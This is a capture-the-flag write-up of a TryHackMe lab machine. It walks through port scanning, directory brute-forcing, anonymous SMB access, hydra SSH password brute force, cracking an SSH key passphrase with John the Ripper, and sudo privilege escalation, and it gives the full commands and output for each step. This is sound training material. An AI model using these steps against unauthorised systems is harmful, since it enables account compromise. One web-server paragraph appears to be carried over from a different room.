# TryHackMe: Basic Pentesting
https://tryhackme.com/room/basicpentestingjt

## 1. Network Enumeration

Use `nmap` to run a quick port scan to see what services are running on the box:

```
$ nmap 10.10.161.1

Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-26 13:50 CET
Nmap scan report for 10.10.161.1
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
```

We see that this box is running the following services: SSH, HTTP, NetBIOS, and SMB. Let's take a look at the HTTP server.

## 2. Web Server

The home page of the web server tells us that we need to find three secret ingredients, but doesn't appear to show any other useful information. However, if we view source, we can see Rick's username: `R1ckRul3s`! We'll write that down for later, but for now lets start `gobuster` to see if we can find any hidden web pages.

```
$ gobuster -u http://<ip-address> -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<ip-address>/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2024/01/22 19:19:01 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/development (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
=====================================================
2024/01/22 19:20:31 Finished
=====================================================
```

We found a `/development` page, let's check it out. There are a couple files here that give us some important information:

- The SMB service has been configured
- There are users that go by K and J
- J has a weak password

Let's move on to the SMB service for now.

## 3. SMB

Let's first list the file shares that are available:

```
$ smbclient -L 10.10.161.1
Password for [WORKGROUP\user]:

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
```

Let's try logging into Anonymous.

```
$ smbclient \\\\10.10.161.1\\Anonymous
Password for [WORKGROUP\samwise]:
Try "help" to get a list of possible commands.      
smb: \> dir
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018

		14318640 blocks of size 1024. 11094428 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

We found a file! There isn't much info here, but we do learn the real names of K and J: Kay and Jan. Since Jan has a weak password, we can try to brute force our way into SSH using `hydra`.

## 4. Hydra

```
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.161.1 ssh -t 64
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 14:30:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.161.1:22/
[STATUS] 769.00 tries/min, 769 tries in 00:01h, 14343722 to do in 310:53h, 64 active
[22][ssh] host: 10.10.161.1   login: jan   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 63 final worker threads did not complete until end.
[ERROR] 63 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 14:31:29
```

We found a password! Now let's login to SSH as jan.

## 5. Privilege Escalation

After loging in, there doesn't seem to be anything interesting in our home directory. We aren't a member of any groups and we have no sudo privileges. Let's checkout the other home directory: `/home/kay`. Kay has an unprotected SSH private key saved: `/home/kay/.ssh/id_rsa`. We can use this key to SSH in as `kay`.

Unfortunately Kay's SSH key is protected with a passphrase. We'll have to attempt to crack it using John the Ripper. First step is to convert the SSH key into a hash file that John the Ripper can consume:

```
$ python /opt/john/run/ssh2john.py id_rsa > id_rsa.john
```

Now we can use John the Ripper with the rockyou wordlist to try to crack the passphrase:

```
$ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<redacted>          (id_rsa)     
1g 0:00:00:00 DONE (2024-01-26 14:41) 6.250g/s 517200p/s 517200c/s 517200C/s behlat..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Success! Now let's try to SSH in again as Kay.

## 6. Privilege Escalation Part 2

Now that we're logged in as Kay, we need to look around for new attack vectors for privilege escalation. Right away I notice an interesting file in Kay's home directory: `pass.bak`. This file looks like it contains Kay's plaintext password! This probably won't help us though, as we're already looged in as Kay.

Let's check more attack vectors. Can we use `sudo`? Turns out we can, be we need Kay's password:

```
$ sudo -l
[sudo] password for kay: <redacted>
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
```

Wow! Turns out we can run any command as `root`. Let's head over to `/root` and find the last flag.

## 7. Root

To become `root`, we can run the following:

```
kay@basic2:~$ sudo su
root@basic2:/home/kay# whoami
root
```

The root flag is located at `/root/flag.txt`.